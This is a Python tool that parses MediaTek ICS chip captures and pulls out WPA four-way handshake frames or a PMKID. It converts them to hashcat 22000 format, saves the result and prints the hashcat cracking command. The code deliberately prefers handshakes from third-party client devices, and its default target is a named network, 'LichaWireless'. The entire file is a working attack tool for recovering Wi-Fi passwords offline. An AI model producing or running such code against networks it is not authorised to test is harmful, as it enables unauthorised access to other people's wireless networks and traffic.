#!/usr/bin/env python3
"""Parse MTK ICS capture and extract WPA handshake for hashcat."""
import struct, sys, os

ICS_MAGIC = b'\x9a\xc9\xd9\x44'
ICS_PKT_SIZE = 320
ICS_HDR_SIZE = 16
RX_DESC_SIZE = 120
FRAME_START = ICS_HDR_SIZE + RX_DESC_SIZE  # 136
MAX_FRAME_LEN = ICS_PKT_SIZE - FRAME_START  # 184

EAPOL_LLC = b'\xaa\xaa\x03\x00\x00\x00\x88\x8e'

def parse_capture(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    
    print(f"[*] Loaded {len(data)} bytes ({len(data)/1024/1024:.1f} MB)")
    
    # Collect M1 and M2 frames
    m1_list = []
    m2_list = []
    
    pos = 0
    pkt_count = 0
    while pos < len(data) - ICS_PKT_SIZE:
        idx = data.find(ICS_MAGIC, pos)
        if idx == -1: break
        pkt_count += 1
        
        frame_start = idx + FRAME_START
        if frame_start + 30 > len(data):
            pos = idx + 1; continue
        
        # Parse 802.11 header
        fc = struct.unpack_from("<H", data, frame_start)[0]
        ver = fc & 3; ft = (fc >> 2) & 3; fst = (fc >> 4) & 0xf
        
        if ver != 0 or ft != 2:  # Not a data frame
            pos = idx + ICS_PKT_SIZE; continue
        
        # Data frame — check for EAPOL
        hdr_len = 26 if fst == 8 else 24  # QoS vs plain
        to_ds = bool(fc & 0x0100)
        from_ds = bool(fc & 0x0200)
        
        llc_start = frame_start + hdr_len
        if llc_start + 8 > idx + ICS_PKT_SIZE:
            pos = idx + ICS_PKT_SIZE; continue
        
        if data[llc_start:llc_start+8] != EAPOL_LLC:
            pos = idx + ICS_PKT_SIZE; continue
        
        # EAPOL frame found!
        ep = llc_start + 8
        if ep + 99 > len(data):
            pos = idx + ICS_PKT_SIZE; continue
        
        eapol_ver = data[ep]
        eapol_type = data[ep + 1]
        eapol_len = struct.unpack_from(">H", data, ep + 2)[0]
        
        if eapol_type != 3:  # Not EAPOL-Key
            pos = idx + ICS_PKT_SIZE; continue
        
        key_info = struct.unpack_from(">H", data, ep + 5)[0]
        ack = bool(key_info & 0x0080)
        mic = bool(key_info & 0x0100)
        install = bool(key_info & 0x0040)
        nonce = data[ep + 17:ep + 49]
        
        # Extract MACs from 802.11 header
        if from_ds and not to_ds:
            sta_mac = data[frame_start+4:frame_start+10]
            ap_mac = data[frame_start+10:frame_start+16]
        else:
            ap_mac = data[frame_start+4:frame_start+10]
            sta_mac = data[frame_start+10:frame_start+16]
        bssid = data[frame_start+16:frame_start+22]
        
        if ack and not mic:
            # M1 (AP → STA)
            key_data_len = struct.unpack_from(">H", data, ep + 97)[0] if ep + 99 <= len(data) else 0
            key_data = data[ep+99:ep+99+key_data_len] if key_data_len > 0 and ep+99+key_data_len <= len(data) else b''
            m1_list.append({
                'ap': ap_mac, 'sta': sta_mac, 'bssid': bssid,
                'anonce': nonce, 'key_data': key_data, 'ki': key_info
            })
        elif not ack and mic and not install:
            # M2 (STA → AP)
            mic_val = data[ep+81:ep+97]
            full_eapol = data[ep:ep+4+min(eapol_len, MAX_FRAME_LEN)]
            m2_list.append({
                'ap': ap_mac, 'sta': sta_mac, 'bssid': bssid,
                'snonce': nonce, 'mic': mic_val, 'ki': key_info,
                'full_eapol': full_eapol
            })
        
        pos = idx + ICS_PKT_SIZE
    
    print(f"[*] Packets: {pkt_count}, M1: {len(m1_list)}, M2: {len(m2_list)}")
    return m1_list, m2_list

def find_handshake_pair(m1_list, m2_list, our_macs=None):
    """Find a valid M1+M2 pair from the SAME STA (preferably third-party)."""
    # Group M2 by STA MAC
    m2_by_sta = {}
    for m2 in m2_list:
        key = m2['sta'].hex()
        if key not in m2_by_sta:
            m2_by_sta[key] = m2
    
    # For each M1, find matching M2 from the same BSSID
    for m1 in m1_list:
        bssid_hex = m1['bssid'].hex()
        for m2 in m2_list:
            if m2['bssid'].hex() == bssid_hex:
                # Skip our own device if specified
                sta_hex = m2['sta'].hex()
                if our_macs and sta_hex in our_macs:
                    continue
                return m1, m2
    
    # Fallback: any M1+M2 pair
    if m1_list and m2_list:
        return m1_list[0], m2_list[0]
    return None, None

def to_hashcat(m1, m2, essid):
    """Convert M1+M2 to hashcat 22000 format."""
    mic_hex = m2['mic'].hex()
    ap_hex = m1['ap'].hex()
    sta_hex = m2['sta'].hex()
    essid_hex = essid.encode().hex()
    anonce_hex = m1['anonce'].hex()
    
    # Zero MIC in M2 EAPOL
    eapol = bytearray(m2['full_eapol'])
    eapol[81:97] = b'\x00' * 16
    eapol_hex = eapol.hex()
    
    return f"WPA*01*{mic_hex}*{ap_hex}*{sta_hex}*{essid_hex}*{anonce_hex}*{eapol_hex}***"

def check_pmkid(m1_list):
    """Check if any M1 contains PMKID."""
    pmkid_tag = b'\xdd\x14\x00\x0f\xac\x04'
    for m1 in m1_list:
        if pmkid_tag in m1['key_data']:
            idx = m1['key_data'].find(pmkid_tag)
            pmkid = m1['key_data'][idx+6:idx+22]
            return pmkid, m1
    return None, None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <capture.bin> [essid]")
        sys.exit(1)
    
    capture = sys.argv[1]
    essid = sys.argv[2] if len(sys.argv) > 2 else "LichaWireless"
    
    m1_list, m2_list = parse_capture(capture)
    
    # Check PMKID first
    pmkid, m1_pmkid = check_pmkid(m1_list)
    if pmkid:
        print(f"\n[!] PMKID found: {pmkid.hex()}")
        hc = f"WPA*02*{pmkid.hex()}*{m1_pmkid['ap'].hex()}*{m1_pmkid['sta'].hex()}*{essid.encode().hex()}***"
        outfile = capture.replace('.bin', '.hc22000')
        with open(outfile, 'w') as f:
            f.write(hc + '\n')
        print(f"[+] Saved to {outfile}")
        print(f"[+] Crack: hashcat -m 22000 {outfile} wordlist.txt")
        sys.exit(0)
    
    # Find M1+M2 pair
    m1, m2 = find_handshake_pair(m1_list, m2_list)
    if m1 and m2:
        print(f"\n[+] Handshake found!")
        print(f"    AP:  {':'.join(f'{b:02x}' for b in m1['ap'])}")
        print(f"    STA: {':'.join(f'{b:02x}' for b in m2['sta'])}")
        
        hc = to_hashcat(m1, m2, essid)
        outfile = capture.replace('.bin', '.hc22000')
        with open(outfile, 'w') as f:
            f.write(hc + '\n')
        print(f"[+] Saved to {outfile}")
        print(f"[+] Crack: hashcat -m 22000 {outfile} wordlist.txt")
    else:
        print(f"\n[-] No complete handshake (M1+M2) found.")
        print(f"    M1 (AP→STA): {len(m1_list)}")
        print(f"    M2 (STA→AP): {len(m2_list)}")
        if m1_list:
            print(f"    Need a device to reconnect to {essid} during capture.")
        sys.exit(1)
